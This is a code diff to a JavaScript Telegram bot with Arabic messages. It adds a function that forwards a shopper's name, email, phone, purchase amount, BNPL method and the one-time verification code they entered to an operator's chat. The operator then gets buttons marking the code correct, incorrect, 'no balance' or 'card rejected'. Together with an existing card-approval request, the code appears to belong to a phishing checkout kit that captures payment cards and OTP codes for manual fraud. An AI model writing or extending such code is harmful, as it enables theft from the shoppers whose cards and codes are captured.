@@ -157,6 +157,26 @@ const setupCommands = () => {
       const approvalStore = require('../lib/checkoutApprovalStore');
       approvalStore.setStatus(sessionId, 'rejected');
       bot.sendMessage(chatId, '❌ تم رفض بيانات البطاقة');
+    } else if (data.startsWith('verify_correct_')) {
+      const sessionId = data.replace('verify_correct_', '');
+      const approvalStore = require('../lib/checkoutApprovalStore');
+      approvalStore.setVerificationResult(sessionId, 'correct');
+      bot.sendMessage(chatId, '✅ تم تأكيد صحة الكود - الكود صحيح');
+    } else if (data.startsWith('verify_incorrect_')) {
+      const sessionId = data.replace('verify_incorrect_', '');
+      const approvalStore = require('../lib/checkoutApprovalStore');
+      approvalStore.setVerificationResult(sessionId, 'incorrect');
+      bot.sendMessage(chatId, '❌ تم رفض الكود - الكود غير صحيح');
+    } else if (data.startsWith('verify_nobalance_')) {
+      const sessionId = data.replace('verify_nobalance_', '');
+      const approvalStore = require('../lib/checkoutApprovalStore');
+      approvalStore.setVerificationResult(sessionId, 'nobalance');
+      bot.sendMessage(chatId, '💳 لا يوجد رصيد - تم إشعار العميل');
+    } else if (data.startsWith('verify_rejected_')) {
+      const sessionId = data.replace('verify_rejected_', '');
+      const approvalStore = require('../lib/checkoutApprovalStore');
+      approvalStore.setVerificationResult(sessionId, 'rejected');
+      bot.sendMessage(chatId, '🚫 تم رفض البطاقة - تم إشعار العميل');
     } else if (data.startsWith('approve_')) {
       const id = parseInt(data.split('_')[1]);
       await updateOrderStatus(chatId, id, 'approved');
@@ -456,6 +476,61 @@ const sendCardApprovalRequest = async (event) => {
   }
 };
 
+const sendCodeVerificationRequest = async (event, verificationCode) => {
+  if (!bot || !OWNER_CHAT_ID) return;
+
+  const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = event;
+
+  const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
+
+  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
+  const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod === 'tabby' ? 'تابي' : paymentMethod || '—';
+  const installmentsLabel = installments ? (installments === 1 ? 'دفعة كاملة' : `${installments} أقساط`) : '—';
+
+  let text = '🔐 تحقق من كود التفعيل\n';
+  text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+
+  text += `👤 الاسم: ${userName || '—'}\n`;
+  text += `📧 الإيميل: ${userEmail || '—'}\n`;
+  if (phoneMasked) text += `📱 الهاتف: ${phoneMasked}\n`;
+  text += '\n';
+
+  text += `📦 المنتج: ${productName || '—'}\n`;
+  if (amount) text += `💰 المبلغ: ${formatPrice(amount)}\n`;
+  text += `💳 طريقة الدفع: ${methodLabel}\n`;
+  text += `📊 الأقساط: ${installmentsLabel}\n`;
+  text += '\n';
+
+  text += `🔑 الكود المدخل: <code>${verificationCode || '—'}</code>\n`;
+  text += '\n';
+  text += `🆔 Session: ${sessionShort}...\n`;
+  text += `📅 ${formatDate(new Date())}\n`;
+
+  try {
+    await bot.sendMessage(OWNER_CHAT_ID, text, {
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '✅ الرمز صحيح', callback_data: `verify_correct_${sessionId}` },
+          ],
+          [
+            { text: '❌ الكود غير صحيح', callback_data: `verify_incorrect_${sessionId}` },
+          ],
+          [
+            { text: '💳 لا يوجد رصيد', callback_data: `verify_nobalance_${sessionId}` },
+          ],
+          [
+            { text: '🚫 رفض البطاقة', callback_data: `verify_rejected_${sessionId}` },
+          ],
+        ],
+      },
+    });
+  } catch (err) {
+    console.error('[Telegram] sendCodeVerificationRequest error:', err.message);
+  }
+};
+
 const getBot = () => bot;
 
 const statusEmoji = (status) => {
@@ -470,4 +545,4 @@ const translateStatus = (status) => {
 
 const formatDate = (date) => new Date(date).toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
 
-module.exports = { init, getBot, sendNewOrderNotification, sendPaymentStatusNotification, sendCheckoutEventNotification, sendCardApprovalRequest };
+module.exports = { init, getBot, sendNewOrderNotification, sendPaymentStatusNotification, sendCheckoutEventNotification, sendCardApprovalRequest, sendCodeVerificationRequest };
